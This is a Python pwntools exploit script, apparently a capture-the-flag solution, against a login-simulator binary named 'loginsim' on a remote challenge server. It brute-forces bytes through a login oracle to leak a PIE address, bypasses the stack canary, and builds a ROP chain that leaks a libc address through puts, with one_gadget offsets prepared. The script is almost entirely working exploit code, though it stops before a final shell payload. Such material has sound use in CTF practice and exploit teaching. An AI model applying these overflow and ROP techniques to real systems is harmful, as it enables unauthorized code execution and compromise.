from pwn import *
import time

# b *getInput+134
# b *getInput+151

gs = '''
continue
'''

elf = context.binary = ELF("./loginsim")
libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        return remote("94.237.61.84", 45492)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def register(longitud, username):
    io.sendlineafter("-> ", b"1")
    io.sendlineafter("{i} Username length: ", str(longitud).encode())
    io.sendlineafter("{i} Enter username: ", username)

def login(username):
    io.sendlineafter("-> ", b"2")
    io.sendlineafter("{i} Username: ", username)

    return "Invalid username! :)" != io.recvline().strip().decode()
        
context.terminal = ['gnome-terminal', '-e']
io = start()

# Fuerza bruta para leak de libc


base_force_brute = 64 + 5
leak_pie = bytearray(b"\x55")

i = 1

register(128, cyclic(base_force_brute - i) + b" A")

for val in range(256):
    if val not in {0, 10, 32}:
        payload = cyclic(base_force_brute - i) + val.to_bytes(1, byteorder="big") + b"A"

        if login(payload):
                leak_pie.append(val)
                print(leak_pie)
                break

i = 2

base_force_brute = 104 + 5

register(128, cyclic(base_force_brute - i) + b" AA")

for val in range(256):
    if val not in {0, 10, 32}:
        payload = cyclic(base_force_brute - i) + val.to_bytes(1, byteorder="big") + b"AA"

        if login(payload):
            leak_pie.append(val)
            print(leak_pie)
            break

# no 3 porque haremos fuerza bruta con los dos bytes para pie

i = 4

base_force_brute = 120 + 5

register(128, cyclic(base_force_brute - i) + b"  AAA")

br = 0

for val_1 in range(1, 256):
    if val_1 not in {0, 10, 32}:
        for val_2 in range(1, 256):
            if val_2 not in {0, 10, 32}:
                payload = cyclic(base_force_brute - i) + val_1.to_bytes(1, byteorder="big") + val_2.to_bytes(1, byteorder="big") + b"AAA"
                if login(payload):
                    leak_pie.append(val_2)
                    leak_pie.append(val_1)
                    print(leak_pie)
                    br = 1
                    break
    if br:
        break
    
leak_pie.reverse()
leak_pie = int(hex(u64(leak_pie.ljust(8, b"\x00"))) + "00", 16)
print(f"Leak pie: {hex(leak_pie)}")

elf.address = leak_pie - 249 - elf.sym.main

rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

print(f"ret: {hex(ret)}")
print(f"pop rdi: {hex(pop_rdi)}")

# Con esto hacemos el buffer overflow
one_gadget = [0xe6c7e, 0xe6c81, 0xe6c84]

payload = b"".join([
    b" "*128,
    b"A"*25,
    b" "*8, # Bypass Canary
    b"B"*6, # Padding rbp
    # ret address
    p64(pop_rdi),
    p64(elf.got.setvbuf),
    p64(elf.plt.puts),
    p64(elf.sym.main)
])

register(128, payload)

leak_setvbuf_libc = u64(io.recvline().strip().ljust(8, b"\x00"))

print(f"Leak Libc: {hex(leak_setvbuf_libc)}")

libc.address = leak_setvbuf_libc - libc.sym.setvbuf

io.interactive()
